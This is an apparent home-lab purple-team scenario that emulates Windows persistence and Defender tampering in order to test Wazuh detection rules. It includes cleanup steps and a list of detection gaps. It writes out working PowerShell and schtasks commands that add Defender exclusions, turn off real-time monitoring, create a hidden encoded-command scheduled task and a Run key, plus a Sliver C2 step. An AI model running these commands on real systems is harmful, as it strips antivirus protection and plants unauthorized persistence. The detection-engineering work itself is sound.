# Scenario 04: Persistence via Scheduled Task + Defender Tampering

> **FOR AUTHORIZED HOME LAB USE ONLY**
> This scenario runs exclusively within the isolated UTM lab (192.168.64.0/24).

---

## Scenario Overview

| Field | Value |
|-------|-------|
| **Objective** | Establish persistence on the Windows victim by creating a malicious scheduled task and disabling Windows Defender monitoring to avoid eviction |
| **Threat Actor Profile** | Attacker who has established initial access and wants to survive reboots |
| **Duration** | ~20 minutes |
| **Complexity** | Beginner–Intermediate |
| **MITRE Techniques** | T1053.005, T1562.001, T1059.001, T1547.001 |
| **Rules Exercised** | 100015, 100016, 100017, 100018, 100019 |

---

## MITRE ATT&CK Coverage

| Phase | Technique | Sub-technique | Description |
|-------|-----------|---------------|-------------|
| Defense Evasion | T1562.001 | Disable or Modify Tools | Defender exclusion via registry + Set-MpPreference |
| Persistence | T1053.005 | Scheduled Task | Task runs PowerShell payload hourly |
| Persistence | T1547.001 | Registry Run Key | HKCU\Run key for user-context persistence |
| Execution | T1059.001 | PowerShell | Task action uses -EncodedCommand |

---

## Prerequisites

- [ ] victim-windows VM running with Administrator PowerShell available
- [ ] Sysmon and Wazuh agent active
- [ ] UTM snapshot taken before starting
- [ ] `IMPORTANT:` Cleanup (re-enabling Defender) is mandatory after this scenario

---

## Step-by-Step Execution

### Phase 1: Disable Windows Defender (Defense Evasion First)

Real attackers typically disable AV before deploying persistence mechanisms.

#### Method A: Registry Modification (stealthy — rule 100015)

```powershell
# [victim-windows — Admin PowerShell]
# Add Defender exclusion for a "tools" directory
# Triggers Sysmon EID 13 (RegistryValueSet) → Wazuh rule 100015 (level 14)

$exclusionPath = "C:\ProgramData\WindowsService"
New-Item -ItemType Directory -Path $exclusionPath -Force | Out-Null

# This writes to HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
Add-MpPreference -ExclusionPath $exclusionPath

Write-Host "Exclusion added: $exclusionPath"
Write-Host "Event time: $([System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ'))"
```

#### Method B: Set-MpPreference to Disable Real-Time Monitoring (loud — rule 100016)

```powershell
# [victim-windows — Admin PowerShell]
# WARNING: This disables AV. Cleanup immediately after testing.
# Triggers Sysmon EID 1 (powershell.exe with Set-MpPreference) → Rule 100016 (level 14)

Set-MpPreference -DisableRealtimeMonitoring $true

# Verify it was disabled
(Get-MpComputerStatus).RealTimeProtectionEnabled  # Should be False
```

#### Method C: Atomic Red Team Test

```powershell
# [victim-windows — Admin PowerShell]
Invoke-AtomicTest T1562.001 -TestNumbers 1
# This runs Add-MpPreference -ExclusionPath "C:\AtomicRedTeam"
```

**Verify in Kibana:**
```
rule.id:(100015 OR 100016) AND agent.name:"victim-windows"
```

---

### Phase 2: Deploy Persistence via Scheduled Task

#### Method A: Atomic Red Team (T1053.005)

```powershell
# [victim-windows — PowerShell as SOCAdmin (no admin needed)]
Invoke-AtomicTest T1053.005 -TestNumbers 1

# This runs schtasks /create with a PowerShell action
# Triggers Sysmon EID 1 → Wazuh rule 100018 (level 12)
Write-Host "Task creation time: $([System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ'))"
```

#### Method B: Manual High-Fidelity Task (triggers rule 100019 — encoded payload)

```powershell
# [victim-windows — PowerShell as SOCAdmin]
# Create a persistence task that runs an encoded PowerShell payload
# Triggers rule 100019 (level 14) — encoded command in task action

$payload = "Write-Host 'Persistence payload executed at ' + [DateTime]::UtcNow"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))

# Create scheduled task with obfuscated payload
schtasks /create `
  /tn "WindowsServiceMonitor" `
  /tr "powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -enc $encoded" `
  /sc ONLOGON `
  /ru SOCAdmin `
  /f

Write-Host "Persistence task created: WindowsServiceMonitor"
Write-Host "Task creation time: $([System.DateTime]::UtcNow.ToString('yyyy-MM-ddTHH:mm:ssZ'))"
```

Verify the task exists:

```powershell
schtasks /query /tn "WindowsServiceMonitor" /fo list | Select-String "Status|Task Name|Run As"
```

#### Method C: Via Sliver C2 Session

```bash
# [kali — sliver session]
sliver (SVCHOST_HELP) > shell
> schtasks /create /tn "WindowsServiceMonitor" /tr "powershell.exe -enc [ENCODED_PAYLOAD]" /sc ONLOGON /f
> exit
```

---

### Phase 3: Registry Run Key Persistence

```powershell
# [victim-windows — PowerShell as SOCAdmin]
# HKCU Run key — fires on user login, no admin required
# Mimics malware that survives reboots via user-context key

$payload = "powershell.exe -WindowStyle Hidden -enc " +
  [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Host 'Persistence'"))

Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "WindowsServiceHelper" `
  -Value $payload

Write-Host "Run key persistence added"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object WindowsServiceHelper
```

> **Note:** This triggers Sysmon EID 13 (registry set on Run key). Our existing rule 100015 monitors Defender keys specifically; the Run key requires an additional rule in Phase 7.

---

## Expected Wazuh Detections

**Kibana queries:**

```
# Defender tampering detections
rule.id:(100015 OR 100016) AND agent.name:"victim-windows"

# Scheduled task detections
rule.id:(100017 OR 100018 OR 100019) AND agent.name:"victim-windows"
```

| Alert | Rule ID | Level | Method | Key Evidence |
|-------|---------|-------|--------|--------------|
| Defender exclusion via registry | 100015 | **14** | Method A | `win.eventdata.targetObject` contains `\Exclusions\` |
| Defender disabled via PowerShell | 100016 | **14** | Method B | `commandLine` contains `Set-MpPreference` + `DisableRealtime` |
| Scheduled task created | 100017 | 10 | ART test | EventID 4698 logged |
| Task with scripting payload | 100018 | 12 | All methods | `schtasks.exe` + `powershell` in commandLine |
| Task with encoded payload | 100019 | **14** | Method B | `schtasks.exe` + `-enc` + writable path |

---

## Evidence to Capture

- [ ] Screenshot of Kibana showing rule 100019 (level 14) firing
- [ ] Raw Sysmon EID 13 event showing `targetObject: ...Windows Defender\Exclusions\Paths`
- [ ] Screenshot of `schtasks /query` output showing the persistence task
- [ ] Screenshot of registry Run key via `regedit` (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
- [ ] Timeline reconstruction: Defender disabled → task created (shows attacker methodology)

---

## Cleanup — MANDATORY

**Always run cleanup immediately after this scenario.**

```powershell
# [victim-windows — Admin PowerShell]

# 1. Remove scheduled tasks
Invoke-AtomicTest T1053.005 -TestNumbers 1 -Cleanup
schtasks /delete /tn "WindowsServiceMonitor" /f 2>$null
schtasks /delete /tn "AtomicTask" /f 2>$null

# 2. Remove registry Run key
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
  -Name "WindowsServiceHelper" -ErrorAction SilentlyContinue

# 3. RE-ENABLE WINDOWS DEFENDER (critical)
Invoke-AtomicTest T1562.001 -TestNumbers 1 -Cleanup
Set-MpPreference -DisableRealtimeMonitoring $false
Remove-MpPreference -ExclusionPath "C:\ProgramData\WindowsService" -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath "C:\AtomicRedTeam" -ErrorAction SilentlyContinue

# 4. Verify Defender status (MUST be enabled before closing session)
$status = Get-MpComputerStatus
Write-Host "AV Enabled:       $($status.AntivirusEnabled)"
Write-Host "Real-Time:        $($status.RealTimeProtectionEnabled)"
Write-Host "Behavior Monitor: $($status.BehaviorMonitorEnabled)"
# All three must be True

# 5. Clean up working directory
Remove-Item "C:\ProgramData\WindowsService" -Recurse -Force -ErrorAction SilentlyContinue
```

**Restore VM snapshot** is strongly recommended after this scenario.

---

## Lessons Learned

**For the interview narrative:**
- Defender tampering always precedes malware deployment in mature attack chains — detecting it is therefore an early-warning signal before the main payload lands
- The registry-based detection (rule 100015) is more reliable than PowerShell monitoring because registry writes are hard to avoid; PowerShell commands can be run in many ways
- The scheduled task detection at level 14 (rule 100019) specifically catches the obfuscation flag (-enc) which separates a legitimate admin task from an attacker's persistence mechanism
- In production, this scenario would also trigger UEBA anomalies (unusual task creation time, unusual parent process for schtasks.exe)

**Detection gaps identified:**
- WMI subscriptions for persistence (`T1546.003`) are not covered by our current ruleset — a common alternative that attackers use when scheduled tasks are monitored
- COM hijacking (`T1546.015`) is another persistence mechanism not yet covered
